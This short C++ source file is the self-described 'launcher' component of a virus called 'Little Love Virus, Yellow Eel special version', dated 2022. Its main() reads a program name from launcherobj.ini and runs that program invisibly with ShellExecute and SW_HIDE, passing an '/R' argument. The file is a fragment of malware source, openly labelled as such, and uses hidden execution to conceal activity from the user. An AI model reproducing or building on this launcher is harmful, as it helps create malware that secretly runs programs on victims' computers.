/*
Little Love Virus
Yellow Eel special version
By wurenji,2022
launcher:main.cpp
The main() of the virus launcher.
*/

#include"std.h"
#include"hide.h"

int _tmain(int argc, TCHAR* argv[])
{
	std::wfstream wfs(_T("launcherobj.ini"), std::ios::in);
	std::wstring fname;
	wfs >> fname;
	wfs.close();
	ShellExecute(NULL, _T("open"), fname.c_str(), _T("/R"), NULL, SW_HIDE);
	return 0;
}